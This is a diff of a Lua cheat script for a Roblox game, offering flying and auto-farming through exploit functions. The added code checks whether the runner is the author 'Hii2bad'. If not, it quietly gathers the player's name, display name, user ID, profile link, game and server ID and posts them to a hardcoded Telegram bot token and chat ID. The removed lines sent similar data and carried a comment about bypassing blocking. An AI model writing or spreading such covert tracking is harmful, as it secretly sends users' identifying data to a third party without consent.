@@ -7,6 +7,7 @@ local player = Players.LocalPlayer
 local TG_TOKEN = "9179755313:AAHtwstX4jeuqhySMeMC-fwclNNY99DHmCI"
 local TG_ID = "7658959090"
 local STATUS_URL = "https://raw.githubusercontent.com/provokator-hub/Survive-the-Lava-for-Eggs-/refs/heads/main/status.txt"
+local MY_NAME = "Hii2bad" 
 
 local isFly, flyConn = false, nil
 local isFarm, lastFarm, lastClick, kills = false, 0, 0, 0
@@ -17,19 +18,32 @@ local touchActive = false
 local function safePrompt(p) if p then pcall(function() fireproximityprompt(p) end) end end
 local function safeTouch(a, b) if a and b then pcall(function() firetouchinterest(a, b, 0) task.wait(0.05) firetouchinterest(a, b, 1) end) end end
 
--- ОТПРАВКА В ТЕЛЕГРАМ ЧЕРЕЗ ОБХОД БЛОКИРОВКИ
+
 task.spawn(function()
-    local text = "👤 Ник: " .. player.Name .. "\n🆔 ID: " .. tostring(player.UserId)
-    pcall(function()
-        -- Создаем фейковый RemoteEvent (Real пропускает это)
-        local bindable = Instance.new("BindableEvent")
-        bindable.Event:Connect(function()
-            game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text}), "application/json")
+    if player.Name ~= MY_NAME then
+        local gameName = "Неизвестно"
+        pcall(function()
+            local ok, res = pcall(function() return game:HttpGet("https://games.roblox.com/v1/games?universeIds=" .. game.GameId) end)
+            if ok and res then
+                local data = HttpService:JSONDecode(res)
+                if data and data.data and data.data[1] then
+                    gameName = data.data[1].name
+                end
+            end
         end)
-        bindable:Fire()
-        task.wait(1)
-        bindable:Destroy()
-    end)
+
+        local text = "🚀 **Новый запуск скрипта!**\n\n"
+            .. "👤 **Ник:** " .. player.Name .. "\n"
+            .. "📝 **DisplayName:** " .. player.DisplayName .. "\n"
+            .. "🆔 **ID:** " .. tostring(player.UserId) .. "\n"
+            .. "🔗 **Профиль:** https://www.roblox.com/users/" .. tostring(player.UserId) .. "/profile\n"
+            .. "🎮 **Игра:** " .. gameName .. " (ID: " .. tostring(game.PlaceId) .. ")\n"
+            .. "🌐 **Сервер:** " .. tostring(game.JobId)
+
+        pcall(function()
+            game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text, parse_mode = "Markdown"}), "application/json")
+        end)
+    end
 end)
 
 local pg = player:WaitForChild("PlayerGui")
